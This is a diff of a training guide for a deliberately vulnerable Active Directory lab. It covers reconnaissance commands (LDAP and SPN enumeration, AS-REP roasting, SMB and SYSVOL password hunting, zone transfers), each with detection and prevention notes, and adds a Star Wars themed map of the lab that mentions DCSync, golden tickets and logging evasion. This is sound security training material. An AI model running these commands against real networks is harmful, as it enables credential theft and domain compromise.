@@ -1,6 +1,6 @@
 # 02 — Reconnaissance (REC-001..015)
 
-Recon is the first 30 minutes of any engagement. Goal: build a map of users, computers, groups, ACLs, trusts, SPNs, GPOs, DNS, shares, and ADCS templates — without anyone noticing. Everything here works **as any authenticated domain user** (often even unauthenticated) because DVAD doesn't filter LDAP reads, doesn't restrict null sessions hard, has zone transfers on, and broadcasts SQL Browser.
+Recon is the first 30 minutes of any engagement. Goal: build a map of users, computers, groups, ACLs, trusts, SPNs, GPOs, DNS, shares, and ADCS templates — without anyone noticing. Everything here works **as any authenticated domain user** (often even unauthenticated) because EMPIRE doesn't filter LDAP reads, doesn't restrict null sessions hard, has zone transfers on, and broadcasts SQL Browser.
 
 Run from your **Kali / BlackArch** on the host bridge (`10.10.0.1` from inside the lab) — reachable to `10.10.0.0/21`, `10.20.0.0/24`, `10.30.0.0/24`. (For unauthenticated entry vectors that come *before* recon, see [`02a-initial-access.md`](02a-initial-access.md).)
 
@@ -13,14 +13,14 @@ Run from your **Kali / BlackArch** on the host bridge (`10.10.0.1` from inside t
 **Steps:**
 ```bash
 # anonymous (yes, often allowed)
-ldapsearch -x -H ldap://10.10.0.10 -b "DC=corp,DC=local" -s sub "(objectClass=user)" sAMAccountName
+ldapsearch -x -H ldap://10.10.0.10 -b "DC=empire,DC=local" -s sub "(objectClass=user)" sAMAccountName
 
 # authenticated
-nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --users
-nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --groups
-nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --computers
+nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' --users
+nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' --groups
+nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' --computers
 
-# PowerView (on ws01)
+# PowerView (on tatooine)
 Import-Module .\PowerView.ps1
 Get-DomainUser | Select samaccountname, description
 Get-DomainGroup -AdminCount 1
@@ -37,7 +37,7 @@ Get-DomainComputer -Properties dnshostname, operatingsystem
 **Tools:** `impacket-GetUserSPNs`, `Rubeus`, `setspn`.
 **Steps:**
 ```bash
-impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10
+impacket-GetUserSPNs empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10
 # windows
 setspn -Q */*
 # Rubeus
@@ -55,9 +55,9 @@ setspn -Q */*
 **Steps:**
 ```bash
 # Linux
-bloodhound-python -u peter.parker -p 'DVADlab2024!' -d corp.local -ns 10.10.0.10 -c all
+bloodhound-python -u peter.parker -p 'EmpireLab2024!' -d empire.local -ns 10.10.0.10 -c all
 # Windows
-.\SharpHound.exe -c All --domain corp.local
+.\SharpHound.exe -c All --domain empire.local
 # upload zips into BloodHound, then run "Find Shortest Paths to Domain Admins"
 ```
 **Detection:** SharpHound has a heavy collection footprint — LDAP queries, SMB session queries on every computer (`NetSessionEnum`, `NetWkstaUserEnum`), bursts of port-445 connects. Microsoft Defender for Identity has a dedicated SharpHound rule.
@@ -73,12 +73,12 @@ bloodhound-python -u peter.parker -p 'DVADlab2024!' -d corp.local -ns 10.10.0.10
 ```powershell
 nltest /domain_trusts /all_trusts
 Get-ADTrust -Filter *
-Get-DomainTrust -SearchBase "DC=corp,DC=local"
+Get-DomainTrust -SearchBase "DC=empire,DC=local"
 ```
 ```bash
-nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --trusted-for-delegation
+nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' --trusted-for-delegation
 ```
-**Detection:** LDAP queries against `CN=System,DC=corp,DC=local` / `trustedDomain` objects.
+**Detection:** LDAP queries against `CN=System,DC=empire,DC=local` / `trustedDomain` objects.
 **Prevention:** enable **SID filtering** on every external/forest trust (we *disabled* it deliberately). Use selective authentication where possible.
 
 ---
@@ -108,7 +108,7 @@ gpresult /SCOPE COMPUTER /Z > gp.txt
 Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs |
   ? { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDACL' }
 # DCSync rights:
-Get-DomainObjectAcl -SearchBase "DC=corp,DC=local" -ResolveGUIDs |
+Get-DomainObjectAcl -SearchBase "DC=empire,DC=local" -ResolveGUIDs |
   ? { $_.ObjectAceType -match 'DS-Replication-Get-Changes' }
 ```
 **Detection:** none reliable — ACL reads are just LDAP queries.
@@ -122,9 +122,9 @@ Get-DomainObjectAcl -SearchBase "DC=corp,DC=local" -ResolveGUIDs |
 **Tools:** `dig`, `nslookup`, `nxc`.
 **Steps:**
 ```bash
-dig @10.10.0.10 corp.local AXFR
-dig @10.10.0.10 _ldap._tcp.dc._msdcs.corp.local SRV
-nslookup -type=ANY corp.local 10.10.0.10
+dig @10.10.0.10 empire.local AXFR
+dig @10.10.0.10 _ldap._tcp.dc._msdcs.empire.local SRV
+nslookup -type=ANY empire.local 10.10.0.10
 ```
 **Detection:** Microsoft DNS logs AXFR via Event `6001`/`6004`. Sigma has rules for "DNS Zone Transfer."
 **Prevention:** in DNS Manager, set zone transfers to "Only to servers listed on the Name Servers tab." Better: disable entirely if you don't have secondaries.
@@ -132,15 +132,15 @@ nslookup -type=ANY corp.local 10.10.0.10
 ---
 
 ### REC-008 — SMB Share Enumeration
-**What it is:** list shares on every host and try to read them with null / guest / authenticated sessions. The classic ways into a network — old scripts left on `\\file01\Public`, GPP `Groups.xml` in SYSVOL.
+**What it is:** list shares on every host and try to read them with null / guest / authenticated sessions. The classic ways into a network — old scripts left on `\\scarif\Public`, GPP `Groups.xml` in SYSVOL.
 **Why it works here:** Guest enabled, anonymous SMB allowed for legacy compatibility.
 **Tools:** `smbclient`, `nxc smb --shares --spider`, `smbmap`.
 **Steps:**
 ```bash
 smbclient -L //10.10.0.13 -N                      # null
-nxc smb 10.10.0.0/24 -u peter.parker -p 'DVADlab2024!' --shares
-nxc smb 10.10.0.13 -u peter.parker -p 'DVADlab2024!' --spider Public --pattern '\.txt|\.ps1|\.bat|password'
-smbmap -H 10.10.0.13 -u peter.parker -p 'DVADlab2024!' -R Public
+nxc smb 10.10.0.0/24 -u peter.parker -p 'EmpireLab2024!' --shares
+nxc smb 10.10.0.13 -u peter.parker -p 'EmpireLab2024!' --spider Public --pattern '\.txt|\.ps1|\.bat|password'
+smbmap -H 10.10.0.13 -u peter.parker -p 'EmpireLab2024!' -R Public
 ```
 **Detection:** Event ID `5140` (network share accessed) at high volume.
 **Prevention:** disable Guest (`net user guest /active:no`), disable `RestrictNullSessAccess=1`, enable SMB signing required.
@@ -155,12 +155,12 @@ smbmap -H 10.10.0.13 -u peter.parker -p 'DVADlab2024!' -R Public
 ```powershell
 Import-Module .\PowerUpSQL.ps1
 Get-SQLInstanceDomain                      # finds via SPN
-Get-SQLInstanceScanUDP -ComputerName sql01 # UDP/1434 broadcast
-Get-SQLServerInfo -Instance sql01.corp.local
-Get-SQLServerLinkCrawl -Instance sql01 -Verbose   # link chain
+Get-SQLInstanceScanUDP -ComputerName kamino # UDP/1434 broadcast
+Get-SQLServerInfo -Instance kamino.empire.local
+Get-SQLServerLinkCrawl -Instance kamino -Verbose   # link chain
 ```
 ```bash
-nxc mssql 10.10.0.14 -u peter.parker -p 'DVADlab2024!' --local-auth
+nxc mssql 10.10.0.14 -u peter.parker -p 'EmpireLab2024!' --local-auth
 ```
 **Detection:** SQL Server logs failed logins (Event `18456`). Defender for Identity has SQL discovery alerts.
 **Prevention:** disable SQL Browser service. Force Windows-only auth. Disable `xp_cmdshell`.
@@ -187,7 +187,7 @@ sudo tcpdump -i virbr1 'udp and (port 137 or port 5353 or port 5355)'
 **Tools:** `net accounts /domain`, `Get-ADDefaultDomainPasswordPolicy`, `nxc smb --pass-pol`.
 **Steps:**
 ```bash
-nxc smb 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --pass-pol
+nxc smb 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' --pass-pol
 ```
 ```powershell
 Get-ADDefaultDomainPasswordPolicy
@@ -199,19 +199,19 @@ Get-ADFineGrainedPasswordPolicy -Filter *      # PSO that overrides default
 ---
 
 ### REC-012 — ADCS Template Enumeration
-**What it is:** list every certificate template published on `ca01.corp.local`, with EKU, enrollment rights, and flags. This is step 0 of ESC1-16.
+**What it is:** list every certificate template published on `endor.empire.local`, with EKU, enrollment rights, and flags. This is step 0 of ESC1-16.
 **Why it works here:** template ACLs allow Domain Users to read.
 **Tools:** `Certify.exe`, `Certipy find`, `certutil`.
 **Steps:**
 ```bash
-certipy find -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -enabled -vulnerable -stdout
+certipy find -u peter.parker@empire.local -p 'EmpireLab2024!' -dc-ip 10.10.0.10 -enabled -vulnerable -stdout
 ```
 ```powershell
 .\Certify.exe find /vulnerable
 .\Certify.exe find /clientauth     # only templates with Client Auth EKU
-certutil -dctemplate -dc dc01.corp.local
+certutil -dctemplate -dc coruscant.empire.local
 ```
-**Detection:** LDAP queries against `CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local`.
+**Detection:** LDAP queries against `CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=empire,DC=local`.
 **Prevention:** review template DACLs; remove `Authenticated Users`/`Domain Users` from Enroll on any template with Client Auth EKU.
 
 ---
@@ -222,9 +222,9 @@ certutil -dctemplate -dc dc01.corp.local
 **Tools:** `impacket-GetNPUsers`, `Rubeus asreproast`.
 **Steps:**
 ```bash
-impacket-GetNPUsers corp.local/ -dc-ip 10.10.0.10 -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hashes
+impacket-GetNPUsers empire.local/ -dc-ip 10.10.0.10 -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hashes
 # or authenticated:
-impacket-GetNPUsers corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 -request -format hashcat
+impacket-GetNPUsers empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10 -request -format hashcat
 ```
 ```powershell
 .\Rubeus.exe asreproast /format:hashcat /outfile:asrep.hashes
@@ -256,12 +256,12 @@ Get-DomainComputer -TrustedToAuth                       # constrained delegation
 **Steps:**
 ```bash
 # Linux mount or smb spider:
-nxc smb 10.10.0.10 -u peter.parker -p 'DVADlab2024!' \
+nxc smb 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' \
    --spider SYSVOL --pattern 'cpassword|password|netuse'
 ```
 ```powershell
 Get-GPPPassword                                    # decrypts cpassword to clear
-findstr /S /I "password" \\corp.local\sysvol\*.*
+findstr /S /I "password" \\empire.local\sysvol\*.*
 ```
 **Detection:** Event `5140` for SYSVOL access at high volume.
 **Prevention:** remove all `Groups.xml`/`Drives.xml`/etc with `cpassword`. Don't put secrets in SYSVOL. Period.
@@ -269,3 +269,85 @@ findstr /S /I "password" \\corp.local\sysvol\*.*
 ---
 
 Next: [`03-credential-access.md`](03-credential-access.md).
+
+---
+
+# The EMPIRE AD Lab: Star Wars Lore & Thematic Mapping
+
+Welcome to the **EMPIRE AD Lab**, where the intricacies of Active Directory align with the galactic struggle between the Galactic Empire, the Rebel Alliance, and the shadow syndicates. This section provides a conceptual thematic mapping between the AD concepts you are attacking and the Star Wars universe.
+
+## The Galactic Topology
+
+The lab topology represents the political structure of the galaxy. Just as trust relationships govern AD, diplomatic and military alliances govern the galaxy.
+
+```mermaid
+graph TD
+    classDef empire fill:#000000,stroke:#ff0000,stroke-width:2px,color:#fff;
+    classDef rebel fill:#2b5c8f,stroke:#ff9900,stroke-width:2px,color:#fff;
+    classDef trade fill:#4a4a4a,stroke:#aaaaaa,stroke-width:2px,color:#fff;
+    classDef highlight fill:#440000,stroke:#ff0000,stroke-width:3px,color:#fff;
+
+    subgraph The Galactic Empire (empire.local)
+        Coruscant["Coruscant (Root DC)<br/>coruscant.empire.local"]:::empire
+        DeathStar["The Death Star (Child DC)<br/>deathstar.eu.empire.local"]:::highlight
+        Scarif["Scarif Citadel (File Server)<br/>scarif.empire.local"]:::empire
+        Kamino["Kamino Cloning Facility (SQL)<br/>kamino.empire.local"]:::empire
+        Endor["Endor Shield Generator (CA)<br/>endor.empire.local"]:::empire
+        Mandalore["Mandalore Mercenary Base (Linux)<br/>mandalore.empire.local"]:::empire
+        Coruscant -- "Imperial Command" --> DeathStar
+        Coruscant --- Scarif
+        Coruscant --- Kamino
+        Coruscant --- Endor
+        Coruscant --- Mandalore
+    end
+
+    subgraph The Rebel Alliance (rebel.local)
+        Yavin4["Yavin 4 Base<br/>yavin4.rebel.local"]:::rebel
+    end
+
+    subgraph The Trade Federation (trade.corp)
+        Neimoidia["Cato Neimoidia<br/>neimoidia.trade.corp"]:::trade
+    end
+
+    Coruscant <-->|Espionage / External Trust| Yavin4
+    Coruscant <-->|Treaty / Forest Trust| Neimoidia
+```
+
+## Infrastructure Mapping
+
+Understanding the infrastructure is key to successfully executing your attack paths. Here is how the technical components of the EMPIRE AD lab map to the Star Wars universe:
+
+### 1. The Core Domains
+* **`empire.local` (The Galactic Empire):** The central root domain. This is the seat of the Emperor and the Imperial Senate. Taking over this domain is equivalent to taking over Coruscant. It controls all the core infrastructure.
+* **`eu.empire.local` (The Death Star):** A child domain of `empire.local`. While it reports to the root domain, it holds immense power. Escaping the child domain to compromise the root domain is the equivalent of using the Death Star plans to destroy the Empire.
+* **`rebel.local` (The Rebel Alliance):** An external forest. It has an external trust with the Empire (perhaps through espionage or captured spies). Moving laterally across this trust requires finding a weak link in the Rebel defenses.
+* **`trade.corp` (The Trade Federation):** A separate forest with a bidirectional forest trust. The Empire uses them for resources, but you can forge trust tickets (Inter-Realm TGTs) to cross this boundary.
+
+### 2. High-Value Targets (Servers)
+* **`coruscant.empire.local` (Coruscant Root DC):** The ultimate prize. Achieving Domain Admin here gives you the keys to the galaxy.
+* **`endor.empire.local` (Endor Shield Generator / ADCS):** Active Directory Certificate Services. If you can compromise the CA (via ESC1, ESC8, etc.), you can forge certificates for any user in the Empire, effectively bringing down the deflector shields.
+* **`scarif.empire.local` (Scarif Citadel):** This file server hosts critical SMB shares. It is the repository of the Death Star plans. Look for exposed passwords in scripts or configuration files left by careless Imperial engineers.
+* **`kamino.empire.local` (Kamino Facility):** The SQL Server. SQL injection or xp_cmdshell here can lead to a foothold. It represents the cloning facilities—a hidden source of power.
+* **`mandalore.empire.local` (Mandalore Base):** The Linux-in-AD member. Contains local privilege escalations and cross-OS pivot opportunities. Represents the mercenary faction employed by the Empire.
+
+### 3. Attack Paths and Tactics
+* **Initial Access (The Smuggler's Route):** Finding an exposed SMB share or exploiting an LLMNR poisoning vulnerability (Responder) is like slipping past the Imperial blockade.
+* **Kerberoasting (Bounty Hunting):** Requesting TGS tickets for service accounts and cracking them offline is like putting a bounty on a high-value target and cracking their encryption.
+* **DCSync (The Force):** Using `secretsdump` to pull the `krbtgt` hash directly from the Domain Controller. It's an invisible, powerful attack that bypasses normal defenses.
+* **Golden Ticket (Order 66):** Once you have the `krbtgt` hash, you can forge a TGT for any user, granting you infinite access. It is the ultimate executive order, overriding all security protocols.
+* **Trust Abuse (Diplomatic Immunity):** Forging a trust ticket to cross from the Child Domain to the Root Domain.
+
+## The Hacker's Code (Sith vs Jedi)
+As you navigate the lab, remember that the tools you use define your path. Will you use noisy, aggressive tools (The Dark Side) that trigger every alarm, or will you use stealthy, precise tradecraft (The Light Side) to move undetected?
+
+* **The Dark Side (Noisy):** Running `BloodHound` with all collection methods, spraying passwords across the entire domain, and dropping standard Mimikatz binaries to disk. It is powerful and fast, but leaves a massive trail.
+* **The Light Side (Stealthy):** Targeted LDAP queries, memory-only execution via Covenant or Cobalt Strike, and careful evasion of logging (AMSI bypasses, ETW patching).
+
+## Flag Locations (Holocrons)
+Hidden throughout the EMPIRE AD lab are flags (Holocrons) that prove your mastery over the environment. Look for `FLAG-*.txt` files on desktops, hidden SMB shares, and within the SQL databases. 
+
+**Remember:** 
+* "Your focus determines your reality." - Qui-Gon Jinn. Focus on the attack paths mapped out in `PLAN.md`.
+* "I find your lack of faith disturbing." - Darth Vader. If an exploit fails, check your syntax, your targeting, and the underlying misconfiguration. The lab is intentionally vulnerable.
+
+May the Force be with you as you conquer the EMPIRE AD!
